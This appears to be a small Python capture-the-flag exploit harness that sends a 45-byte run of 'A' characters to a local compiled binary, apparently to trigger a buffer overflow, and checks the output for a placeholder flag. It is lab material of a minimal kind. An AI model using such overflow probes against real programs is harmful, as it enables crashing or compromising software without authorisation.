import subprocess
import sys

def check_flag(output: tuple) -> bool:
    flag = b'CTF_FLAG{example_flag}'
    for out in output:
        if flag in out:
            return True
    return False

def print_win():
    print("-"*80)
    print("Exploit Success")
    print("-"*80)

print("starting exploit...\n")
flag = b'CTF_FLAG{example_flag}'
cmd = "/home/stiles/repos/cli-instrument/build/a.out"
payload = b'A'*45
proc = subprocess.Popen([cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
output = proc.communicate(input=payload, timeout=3)

[print(x.decode()) for x in output if type(x) is bytes]

if check_flag(output):
    print_win()
    sys.exit(0)
else:
    sys.exit(1)
